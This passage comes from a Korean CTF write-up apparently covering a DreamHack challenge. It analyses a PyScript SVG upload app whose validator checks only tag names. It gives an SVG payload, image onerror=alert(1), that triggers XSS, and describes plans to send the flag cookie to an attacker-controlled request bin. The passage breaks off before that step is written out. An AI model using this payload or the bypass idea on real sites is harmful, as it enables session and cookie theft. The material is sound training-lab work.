+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>directions </span><span style="color:#f29e74;">= </span><span>[{</span><span style="color:#bae67e;">&#39;x&#39;</span><span style="color:#ccc9c2cc;">: </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">choice</span><span>([</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>])</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;y&#39;</span><span style="color:#ccc9c2cc;">: </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">choice</span><span>([</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>])} </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#f28779;">len</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>paths))]
+</span><span>
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>interval </span><span style="color:#f29e74;">= </span><span>interval
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>timer </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">set_interval</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>animate</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>interval)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">animate</span><span>(</span><span style="color:#ffcc66;">self</span><span>):
+</span><span>        </span><span style="color:#ffa759;">for </span><span>i</span><span style="color:#ccc9c2cc;">, </span><span>path </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">enumerate</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>paths):
+</span><span>            pos </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>positions[i]
+</span><span>            </span><span style="color:#f28779;">dir </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>directions[i]
+</span><span>
+</span><span>            pos[</span><span style="color:#bae67e;">&#39;x&#39;</span><span>] </span><span style="color:#f29e74;">+= </span><span style="color:#f28779;">dir</span><span>[</span><span style="color:#bae67e;">&#39;x&#39;</span><span>] </span><span style="color:#f29e74;">* </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">uniform</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">5</span><span>)
+</span><span>            pos[</span><span style="color:#bae67e;">&#39;y&#39;</span><span>] </span><span style="color:#f29e74;">+= </span><span style="color:#f28779;">dir</span><span>[</span><span style="color:#bae67e;">&#39;y&#39;</span><span>] </span><span style="color:#f29e74;">* </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">uniform</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">5</span><span>)
+</span><span>
+</span><span>            </span><span style="color:#ffa759;">if </span><span>pos[</span><span style="color:#bae67e;">&#39;x&#39;</span><span>] </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">40 </span><span style="color:#f29e74;">or </span><span>pos[</span><span style="color:#bae67e;">&#39;x&#39;</span><span>] </span><span style="color:#f29e74;">&lt; -</span><span style="color:#ffcc66;">40</span><span>:
+</span><span>                </span><span style="color:#f28779;">dir</span><span>[</span><span style="color:#bae67e;">&#39;x&#39;</span><span>] </span><span style="color:#f29e74;">*= -</span><span style="color:#ffcc66;">1
+</span><span>            </span><span style="color:#ffa759;">if </span><span>pos[</span><span style="color:#bae67e;">&#39;y&#39;</span><span>] </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">40 </span><span style="color:#f29e74;">or </span><span>pos[</span><span style="color:#bae67e;">&#39;y&#39;</span><span>] </span><span style="color:#f29e74;">&lt; -</span><span style="color:#ffcc66;">40</span><span>:
+</span><span>                </span><span style="color:#f28779;">dir</span><span>[</span><span style="color:#bae67e;">&#39;y&#39;</span><span>] </span><span style="color:#f29e74;">*= -</span><span style="color:#ffcc66;">1
+</span><span>
+</span><span>            path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">setAttribute</span><span>(</span><span style="color:#bae67e;">&quot;transform&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;translate(</span><span>{pos[</span><span style="color:#bae67e;">&#39;x&#39;</span><span>]}</span><span style="color:#bae67e;">, </span><span>{pos[</span><span style="color:#bae67e;">&#39;y&#39;</span><span>]}</span><span style="color:#bae67e;">)&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">stop</span><span>(</span><span style="color:#ffcc66;">self</span><span>):
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#f28779;">hasattr</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;timer&#39;</span><span>):
+</span><span>            </span><span style="color:#ffd580;">clear_interval</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>timer)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">load_svg_from_string</span><span>(</span><span style="color:#ffcc66;">svg_string</span><span>):
+</span><span>    parser </span><span style="color:#f29e74;">= </span><span>DOMParser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">new</span><span>()
+</span><span>    doc </span><span style="color:#f29e74;">= </span><span>parser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">parseFromString</span><span>(svg_string</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;image/svg+xml&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">return </span><span>doc</span><span style="color:#f29e74;">.</span><span>documentElement
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">handle_upload</span><span>(</span><span style="color:#ffcc66;">event</span><span>):
+</span><span>    event</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">preventDefault</span><span>()
+</span><span>    file_input </span><span style="color:#f29e74;">= </span><span>document</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementById</span><span>(</span><span style="color:#bae67e;">&#39;file-input&#39;</span><span>)
+</span><span>    file </span><span style="color:#f29e74;">= </span><span>file_input</span><span style="color:#f29e74;">.</span><span>files</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">item</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file:
+</span><span>        file_reader </span><span style="color:#f29e74;">= </span><span>FileReader</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">new</span><span>()
+</span><span>        file_reader</span><span style="color:#f29e74;">.</span><span>onload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">create_proxy</span><span>(</span><span style="color:#ffa759;">lambda </span><span style="color:#ffcc66;">e</span><span>: </span><span style="color:#ffd580;">load_new_svg</span><span>(file_reader</span><span style="color:#f29e74;">.</span><span>result))
+</span><span>        file_reader</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readAsText</span><span>(file)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">load_svg_from_string</span><span>(</span><span style="color:#ffcc66;">svg_string</span><span>):
+</span><span>    parser </span><span style="color:#f29e74;">= </span><span>DOMParser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">new</span><span>()
+</span><span>    doc </span><span style="color:#f29e74;">= </span><span>parser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">parseFromString</span><span>(svg_string</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;image/svg+xml&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">if </span><span>doc</span><span style="color:#f29e74;">.</span><span>documentElement</span><span style="color:#f29e74;">.</span><span>tagName </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&quot;svg&quot; </span><span style="color:#f29e74;">or </span><span>doc</span><span style="color:#f29e74;">.</span><span>documentElement</span><span style="color:#f29e74;">.</span><span>namespaceURI </span><span style="color:#f29e74;">not in </span><span>[</span><span style="color:#bae67e;">&quot;http://www.w3.org/2000/svg&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;x&quot;</span><span>]:
+</span><span>        </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#bae67e;">&quot;Root element is not &lt;svg&gt; or has incorrect namespace&quot;</span><span>)
+</span><span>
+</span><span>    allowed_elements </span><span style="color:#f29e74;">= </span><span>[
+</span><span>        </span><span style="color:#bae67e;">&quot;svg&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;path&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;rect&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;circle&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;ellipse&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;line&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;polyline&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;polygon&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;text&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;tspan&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;textPath&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyph&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyphDef&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyphItem&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;glyphRef&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyph&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;animate&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;animateColor&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;animateMotion&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;animateTransform&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;mpath&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;set&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;desc&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;title&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;metadata&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;defs&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;g&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;symbol&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;use&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;image&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;switch&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;style&quot;
+</span><span>    ]
+</span><span>
+</span><span>    elements </span><span style="color:#f29e74;">= </span><span>doc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementsByTagName</span><span>(</span><span style="color:#bae67e;">&quot;*&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">for </span><span>element </span><span style="color:#ffa759;">in </span><span>elements:
+</span><span>        </span><span style="color:#ffa759;">if </span><span>element</span><span style="color:#f29e74;">.</span><span>tagName </span><span style="color:#f29e74;">not in </span><span>allowed_elements:
+</span><span>            </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;Disallowed SVG element found: </span><span>{element</span><span style="color:#f29e74;">.</span><span>tagName}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">return </span><span>doc</span><span style="color:#f29e74;">.</span><span>documentElement
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">load_new_svg</span><span>(</span><span style="color:#ffcc66;">svg_content</span><span>):
+</span><span>    svg_container </span><span style="color:#f29e74;">= </span><span>document</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementById</span><span>(</span><span style="color:#bae67e;">&#39;svg-container&#39;</span><span>)
+</span><span>    original_svg_content </span><span style="color:#f29e74;">= </span><span>document</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementById</span><span>(</span><span style="color:#bae67e;">&#39;original-svg-content&#39;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">try</span><span>:
+</span><span>        svg_element </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">load_svg_from_string</span><span>(svg_content)
+</span><span>        </span><span style="color:#ffa759;">if </span><span>svg_element</span><span style="color:#f29e74;">.</span><span>tagName </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&quot;svg&quot;</span><span>:
+</span><span>            original_svg_content</span><span style="color:#f29e74;">.</span><span>innerHTML </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Invalid SVG!!&quot;
+</span><span>            svg_container</span><span style="color:#f29e74;">.</span><span>innerHTML </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Invalid SVG!!&quot;
+</span><span>            </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#bae67e;">&quot;Not a valid SVG&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">except </span><span style="font-style:italic;color:#5ccfe6;">Exception </span><span style="color:#ffa759;">as </span><span>e:
+</span><span>        original_svg_content</span><span style="color:#f29e74;">.</span><span>innerHTML </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Invalid SVG!!&quot;
+</span><span>        svg_container</span><span style="color:#f29e74;">.</span><span>innerHTML </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Invalid SVG!!&quot;
+</span><span>        console</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">error</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;Invalid SVG: </span><span>{e}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return
+</span><span>
+</span><span>    original_svg_content</span><span style="color:#f29e74;">.</span><span>innerHTML </span><span style="color:#f29e74;">= </span><span>svg_content
+</span><span>
+</span><span>    svg_element </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">load_svg_from_string</span><span>(svg_content)
+</span><span>    svg_container</span><span style="color:#f29e74;">.</span><span>innerHTML </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;&quot;
+</span><span>    svg_container</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">appendChild</span><span>(svg_element)
+</span><span>
+</span><span>    </span><span style="color:#ffd580;">initialize_svg_mover</span><span>(svg_content)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">initialize_svg_mover</span><span>(</span><span style="color:#ffcc66;">svg_content</span><span>):
+</span><span>    </span><span style="color:#ffa759;">global </span><span>svg_mover
+</span><span>    svg_element </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">load_svg_from_string</span><span>(svg_content)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>svg_mover:
+</span><span>        svg_mover</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">stop</span><span>()
+</span><span>    svg_mover </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">SvgMover</span><span>(svg_element</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">interval</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">50</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">async def </span><span style="color:#ffd580;">fetch_svg</span><span>(</span><span style="color:#ffcc66;">file</span><span>):
+</span><span>    response </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">await </span><span style="color:#ffd580;">pyfetch</span><span>(file)
+</span><span>    svg_content </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">await </span><span>response</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">text</span><span>()
+</span><span>    </span><span style="color:#ffd580;">load_new_svg</span><span>(svg_content)
+</span><span>
+</span><span>upload_form </span><span style="color:#f29e74;">= </span><span>document</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementById</span><span>(</span><span style="color:#bae67e;">&#39;upload-form&#39;</span><span>)
+</span><span>upload_form</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">addEventListener</span><span>(</span><span style="color:#bae67e;">&#39;submit&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">create_proxy</span><span>(handle_upload))
+</span><span>
+</span><span style="color:#ffa759;">async def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    file </span><span style="color:#f29e74;">= </span><span>window</span><span style="color:#f29e74;">.</span><span>location</span><span style="color:#f29e74;">.</span><span>search</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&#39;file=&#39;</span><span>)[</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;file=&#39; </span><span style="color:#f29e74;">in </span><span>window</span><span style="color:#f29e74;">.</span><span>location</span><span style="color:#f29e74;">.</span><span>search </span><span style="color:#ffa759;">else </span><span style="color:#bae67e;">&#39;uploads/default.svg&#39;
+</span><span>    </span><span style="color:#ffa759;">await </span><span style="color:#ffd580;">fetch_svg</span><span>(file)
+</span><span>
+</span><span style="color:#ffa759;">import </span><span>asyncio
+</span><span>asyncio</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ensure_future</span><span>(</span><span style="color:#ffd580;">main</span><span>())
+</span><span>
+</span></code></pre>
+
+  </div>
+</div>
+<h4 id="load-svg-from-string">load_svg_from_string()</h4>
+<ol>
+<li>
+<p>파싱단계</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>parser </span><span style="color:#f29e74;">= </span><span>DOMParser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">new</span><span>()
+</span><span>doc </span><span style="color:#f29e74;">= </span><span>parser</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">parseFromString</span><span>(svg_string</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;image/svg+xml&quot;</span><span>)
+</span></code></pre>
+<p><code>svg_string</code>(문자열) 을 DOM으로 파싱해 <code>doc</code>(Document 객체)를 만든다.<br />
+<code>image/svg+xml</code> MIME 타입으로 파싱하니까 브라우저/DOM 구현체가 SVG 문법을 기준으로 해석한다.</p>
+<div tabindex="0" class="collapse collapse-arrow bg-base-100 border-gray-500/15 border">
+  <div class="collapse-title font-semibold">
+    MIME 타입이란?
+  </div>
+  <div class="collapse-content text-sm">
+    <p>MIME 타입은 Multipurpose Internet Mail Extensions type 의 약자로,<br />
+<code>이 데이터가 어떤 종류의 콘텐츠인지</code>를 명확하게 알려주는 식별자이다.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>예시:  
+</span><span> &quot;html/text&quot; -&gt; HTML 문서  
+</span><span> &quot;application/json&quot; -&gt; JSON 데이터  
+</span><span> &quot;image/png&quot; -&gt; PNG 이미지  
+</span><span> &quot;image/svg+xml&quot; -&gt; SVG(XML 기반 이미지)
+</span><span>
+</span><span>&gt; MIME 타입은 브라우저나 파서에게 “이 문자열을 어떤 문법으로 해석해야 하는지”를 알려주는 기준이다.</span></code></pre>
+
+  </div>
+</div>
+<p>이 시점에서 <code>doc.documentElement</code>는 SVG의 루트 엘리먼트 <code>&lt;svg&gt;</code>가 된다.<br />
+문자열 -&gt; DOM 으로 바뀌는 순간부터, 이후엔 태그 목록/속성 등을 순회하며 검증할 수 있다.</p>
+</li>
+<li>
+<p>루트 엘리먼트 검사</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>
+</span><span style="color:#ffa759;">if </span><span>doc</span><span style="color:#f29e74;">.</span><span>documentElement</span><span style="color:#f29e74;">.</span><span>tagName </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&quot;svg&quot; </span><span style="color:#f29e74;">or </span><span>doc</span><span style="color:#f29e74;">.</span><span>documentElement</span><span style="color:#f29e74;">.</span><span>namespaceURI </span><span style="color:#f29e74;">not in </span><span>[</span><span style="color:#bae67e;">&quot;http://www.w3.org/2000/svg&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;x&quot;</span><span>]:
+</span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#bae67e;">&quot;Root element is not &lt;svg&gt; or has incorrect namespace&quot;</span><span>)
+</span></code></pre>
+<ol>
+<li>루트가 진짜 <code>&lt;svg&gt;</code> 인지 검사한다.<br />
+(svg 인척 하면서 &lt;html&gt; , &lt;script&gt; 등을 막기 위해)</li>
+<li>namespaceURI 가 허용된 값인지 검사한다.<br />
+일반적인 SVG namespace는 <code>http://www.w3.org/2000/svg</code> 혹은 <code>http://www.w3.org/1999/xlink</code> 이다.<br />
+루트 엘리먼트 , namespace 검사를 통해 일반적인 svg가 아닌 파일을 걸러내기 위한 검증 절차이다.</li>
+</ol>
+</li>
+<li>
+<p>허용 태그 (allow list) 정의</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>    allowed_elements </span><span style="color:#f29e74;">= </span><span>[
+</span><span>    </span><span style="color:#bae67e;">&quot;svg&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;path&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;rect&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;circle&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;ellipse&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;line&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;polyline&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;polygon&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;text&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;tspan&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;textPath&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyph&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyphDef&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyphItem&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;glyphRef&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;altGlyph&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;animate&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;animateColor&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;animateMotion&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;animateTransform&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;mpath&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;set&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;desc&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;title&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;metadata&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;defs&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;g&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;symbol&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;use&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;image&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;switch&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;style&quot;
+</span><span>]
+</span><span>
+</span><span>    elements </span><span style="color:#f29e74;">= </span><span>doc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementsByTagName</span><span>(</span><span style="color:#bae67e;">&quot;*&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">for </span><span>element </span><span style="color:#ffa759;">in </span><span>elements:
+</span><span>        </span><span style="color:#ffa759;">if </span><span>element</span><span style="color:#f29e74;">.</span><span>tagName </span><span style="color:#f29e74;">not in </span><span>allowed_elements:
+</span><span>            </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;Disallowed SVG element found: </span><span>{element</span><span style="color:#f29e74;">.</span><span>tagName}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">return </span><span>doc</span><span style="color:#f29e74;">.</span><span>documentElement
+</span></code></pre>
+<p>이 allow list를 통해 &lt;script&gt; &lt;object&gt; &lt;iframe&gt; 등의 태그에서 공격시도를 막을 수 있지만<br />
+태그만 검사할뿐, 속성을 검사하지는 않고 있다.<br />
+따라서 image , animate 등의 태그를 통해 window.open , location 등 다양한 속성을 통해 공격이 가능하다.</p>
+</li>
+</ol>
+<h2 id="gonggyeog-geomjeung">공격 검증</h2>
+<p>다음과 같이 조건을 만족하는 svg 파일을 만들어 xss를 시도해보자.</p>
+<pre data-lang="vim" style="background-color:#212733;color:#ccc9c2;" class="language-vim "><code class="language-vim" data-lang="vim"><span style="font-style:italic;color:#5ccfe6;">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+</span><span style="font-style:italic;color:#5ccfe6;">&lt;image src=&quot;x&quot; onerror=&quot;alert(1)&quot;/&gt;
+</span><span style="font-style:italic;color:#5ccfe6;">&lt;/svg&gt;
+</span></code></pre>
+<p>위에서 만든 svg 파일을 업로드하면 xss가 트리거되는 것을 확인할 수 있다.
+<img src="https://parkpingx2.github.io/study/2025-12-w4/images/ptml4.png" alt="4" /></p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>cookie </span><span style="color:#f29e74;">= </span><span>{</span><span style="color:#bae67e;">&quot;name&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;flag&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;value&quot;</span><span style="color:#ccc9c2cc;">: </span><span>FLAG}
+</span></code></pre>
+<p>그럼 <code>app.py</code> 의 <code>read_file()</code>함수에서 flag를 쿠키로 불러오기 때문에 document.cookie를 통해 flag를 확인하면 된다.</p>
+<p>단, 단순히 alert() 함수로 document.cookie를 실행하면 빈칸이 나오거나,<br />
+flag가 아닌 내가 가지고 있던 임의의 쿠키가 나온다.</p>
+<p>이는 xss가 실행이 되긴 하지만 기본적으로 클라이언트 취약점이기 때문에,<br />
+서버에서 크롬 드라이버가 트리거 후 flag는 서버쪽의 alert에서만 발생하며,<br />
+우리는 확인할 방법이 없다.</p>
+<p>따라서 공격자 서버를 통해 cookie를 전달받아야 한다.<br />
+이는 공격자가 xss를 통해 정보를 추출해내는 실제 공격 방법 구현 가능 여부를 의도한 것이다.</p>
+<h2 id="exploit">exploit</h2>
+<p>먼저 공격자 서버는 DreamHack Tools 서비스의 Request Bin을 이용해준다.<br />
+(그 외에도 webhook , 자체 구현 서버, ngork 등 여러 방법이 존재한다.)
+<img src="https://parkpingx2.github.io/study/2025-12-w4/images/ptml5.png" alt="5" /></p>
